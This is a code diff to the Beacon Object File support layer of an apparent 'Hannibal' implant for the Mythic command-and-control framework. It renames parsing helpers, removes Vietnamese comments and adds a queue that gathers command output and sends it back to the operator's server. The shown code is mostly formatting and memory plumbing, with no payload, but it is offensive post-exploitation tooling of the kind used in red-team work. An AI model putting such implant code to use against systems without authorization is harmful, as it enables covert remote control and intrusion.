@@ -13,7 +13,7 @@ void BeaconDataParse(datap* parser, char* buffer, int size) {
     parser->buffer += 4;
 }
 
-int BeaconDataInt(datap* parser) {
+int BeaconDataInt32(datap* parser) {
     int fourbyteint = 0;
     if (parser->length < 4) {
         return 0;
@@ -89,7 +89,6 @@ void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
         if (*pszFormat == L'%') {
             pszFormat++;
             
-            // Kiểm tra prefix 'l' (cho long)
             BOOL isLong = FALSE;
             if (*pszFormat == L'l') {
                 isLong = TRUE;
@@ -180,14 +179,11 @@ void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
                     PVOID ptr = va_arg(args, PVOID);
                     ULONG_PTR value = (ULONG_PTR)ptr;
                     
-                    // Thêm tiền tố "0x"
                     *pszEnd++ = L'0';
                     *pszEnd++ = L'x';
                     
-                    // Xác định số bit của con trỏ (32 hoặc 64-bit)
                     int numHexDigits = sizeof(PVOID) * 2;
                     
-                    // In tất cả các chữ số hex, kể cả số 0 ở đầu
                     for (int i = numHexDigits - 1; i >= 0; i--) {
                         int digit = (value >> (i * 4)) & 0xF;
                         *pszEnd++ = hexChars[digit];
@@ -218,19 +214,15 @@ void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
                 
                 case L'f':
                 case L'g': {
-                    // Xử lý đơn giản số thực dạng "float" và "double"
                     double value = va_arg(args, double);
                     
-                    // Xử lý dấu
                     if (value < 0) {
                         *pszEnd++ = L'-';
                         value = -value;
                     }
                     
-                    // Lấy phần nguyên
                     ULONG64 intPart = (ULONG64)value;
                     
-                    // Xử lý phần nguyên
                     WCHAR intDigits[32];
                     int intDigitCount = 0;
                     
@@ -243,12 +235,10 @@ void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
                         }
                     }
                     
-                    // In phần nguyên (đảo ngược)
                     for (int i = intDigitCount - 1; i >= 0; i--) {
                         *pszEnd++ = intDigits[i];
                     }
                     
-                    // Lấy phần thập phân (giới hạn 6 chữ số thập phân)
                     value -= (ULONG64)value;
                     if (value > 0) {
                         *pszEnd++ = L'.';
@@ -259,7 +249,6 @@ void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
                             *pszEnd++ = digit + L'0';
                             value -= digit;
                             
-                            // Dừng lại nếu phần thập phân là 0
                             if (value < 0.000001)
                                 break;
                         }
@@ -274,7 +263,6 @@ void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
                             *pszEnd++ = *str++;
                         }
                     } else {
-                        // Xử lý chuỗi NULL
                         LPCWSTR nullStr = L"(null)";
                         while (*nullStr != L'\0') {
                             *pszEnd++ = *nullStr++;
@@ -295,7 +283,6 @@ void BeaconPrintf(DWORD64 pszDest, wchar_t* pszFormat, ...) {
                 }
                 
                 default:
-                    // Giữ nguyên các định dạng không hỗ trợ
                     *pszEnd++ = L'%';
                     if (isLong)
                         *pszEnd++ = L'l';
@@ -577,7 +564,7 @@ int BeaconSprintf(char* dest, const char* format, ...) {
     return chars_written;
 }
 
-int ParseInt32(PBYTE* args) {
+int BeaconParseInt32(PBYTE* args) {
     int value = 0;
     memcpy(&value, *args, sizeof(int));
     *args += sizeof(int);
@@ -586,7 +573,7 @@ int ParseInt32(PBYTE* args) {
 
 #pragma GCC push_options
 #pragma GCC optimize ("O0")
-char* ParseString(PBYTE* args) {
+char* BeaconParseString(PBYTE* args) {
     int length = 0;
     PBYTE current = *args;
     
@@ -601,7 +588,7 @@ char* ParseString(PBYTE* args) {
     return string;
 }
 
-LPCWSTR ParseWideString(PBYTE* args) {
+LPCWSTR BeaconParseWideString(PBYTE* args) {
     int length = 0;
     PWCHAR current = (PWCHAR)*args;
     
@@ -614,4 +601,191 @@ LPCWSTR ParseWideString(PBYTE* args) {
     *args += (length + 1) * sizeof(WCHAR); // Move past wide string and null terminator
     return string;
 }
+
+void BeaconCharToWideString(char* str, wchar_t* wideStr) {
+    if (str == NULL || wideStr == NULL) {
+        return; // Invalid input
+    }
+    int length = pic_strlen(str);
+    if (wideStr == NULL) {
+        return NULL; // Memory allocation failed
+    }
+    
+    for (int i = 0; i < length; i++) {
+        wideStr[i] = (wchar_t)str[i];
+    }
+    wideStr[length] = L'\0'; // Null-terminate the wide string
+    
+    return;
+
+}
+
+SECTION_CODE PMESSAGE_QUEUE BeaconCreateMessageQueue() {
+    // Create a new message root of the message queue.
+
+    HANNIBAL_INSTANCE_PTR
+
+    PMESSAGE_QUEUE queue = (PMESSAGE_QUEUE)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE_QUEUE));
+
+    queue->size = 0;
+    queue->content = NULL;
+    queue->next = NULL;
+
+    return queue;
+}
+
+SECTION_CODE BOOL BeaconAddMessageToQueue(PMESSAGE_QUEUE root, LPCWSTR message) {
+    // Add a new message to the queue using root as the first node
+    HANNIBAL_INSTANCE_PTR
+
+    if (!root || !message) {
+        return FALSE;
+    }
+
+    // If root has no content, use it instead of creating new node
+    if (root->content == NULL) {
+        root->size = pic_strlenW(message);
+        root->content = (LPCWSTR)hannibal_instance_ptr->Win32.HeapAlloc(
+            hannibal_instance_ptr->Win32.GetProcessHeap(),
+            HEAP_ZERO_MEMORY,
+            (root->size + 1) * sizeof(WCHAR)
+        );
+        if (!root->content) {
+            return FALSE;
+        }
+        pic_strcatW(root->content, message);
+        return TRUE;
+    }
+
+    // Create new message node
+    PMESSAGE_QUEUE current = root;
+    while (current->next != NULL) {
+        current = current->next;
+    }
+
+    // Add new node at the end
+    PMESSAGE_QUEUE newMessage = (PMESSAGE_QUEUE)hannibal_instance_ptr->Win32.HeapAlloc(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        sizeof(MESSAGE_QUEUE)
+    );
+    if (!newMessage) {
+        return FALSE;
+    }
+
+    newMessage->size = pic_strlenW(message);
+    newMessage->content = (LPCWSTR)hannibal_instance_ptr->Win32.HeapAlloc(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        (newMessage->size + 1) * sizeof(WCHAR)
+    );
+    if (!newMessage->content) {
+        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), 0, newMessage);
+        return FALSE;
+    }
+    
+    pic_strcatW(newMessage->content, message);
+    current->next = newMessage;
+    return TRUE;
+}
+
+// SECTION_CODE BOOL _BeaconHannibalResponse(LPCWSTR message, LPCSTR task_uuid) {
+//     // Just a wrapper over task_enqueue. Do not suppose to be used outside of this file.
+//     HANNIBAL_INSTANCE_PTR   
+
+//     TASK response_t; 
+//     response_t.output = (LPCSTR)message;
+//     response_t.output_size = (pic_strlenW(message) + 1) * sizeof(WCHAR);
+//     response_t.task_uuid = task_uuid; // Freed in mythic_http_post_tasks()
+
+//     task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);
+//     return TRUE;
+// }
+
+SECTION_CODE BOOL BeaconCleanUpMessageQueue(PMESSAGE_QUEUE root) {
+    // Clean up the entire queue including root node
+    HANNIBAL_INSTANCE_PTR
+
+    if (!root) {
+        return FALSE;
+    }
+
+    PMESSAGE_QUEUE current = root;
+    PMESSAGE_QUEUE next;
+
+    while (current != NULL) {
+        next = current->next;
+        if (current->content) {
+            hannibal_instance_ptr->Win32.HeapFree(
+                hannibal_instance_ptr->Win32.GetProcessHeap(), 
+                0, 
+                current->content
+            );
+        }
+        hannibal_instance_ptr->Win32.HeapFree(
+            hannibal_instance_ptr->Win32.GetProcessHeap(), 
+            0, 
+            current
+        );
+        current = next;
+    }
+
+    return TRUE;
+}
+
+SECTION_CODE BOOL BeaconSendAllMessages(PMESSAGE_QUEUE root, LPCSTR task_uuid) {
+    // Concatenate and send all messages starting from root
+    HANNIBAL_INSTANCE_PTR
+
+    if (!root || !task_uuid) {
+        return FALSE;
+    }
+
+    // Calculate total size including root's content
+    int totalSize = 0;
+    PMESSAGE_QUEUE current = root;
+    
+    while (current != NULL) {
+        if (current->content) {
+            totalSize += current->size;
+        }
+        current = current->next;
+    }
+
+    // Add space for null terminator
+    totalSize += sizeof(WCHAR);
+
+    // Allocate memory for concatenated message
+    wchar_t* concatenatedMessage = (wchar_t*)hannibal_instance_ptr->Win32.HeapAlloc(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        totalSize * sizeof(WCHAR)
+    );
+
+    if (!concatenatedMessage) {
+        return FALSE;
+    }
+
+    // Concatenate messages including root's content
+    current = root;
+    while (current != NULL) {
+        if (current->content) {
+            BeaconStrcatW(concatenatedMessage, current->content);
+        }
+        current = current->next;
+    }
+
+    // Send concatenated message
+    hannibal_response(concatenatedMessage, task_uuid);
+
+    // Cleanup
+    hannibal_instance_ptr->Win32.HeapFree(
+        hannibal_instance_ptr->Win32.GetProcessHeap(),
+        0,
+        concatenatedMessage
+    );
+    return TRUE;
+}
+
+
 #pragma GCC pop_options
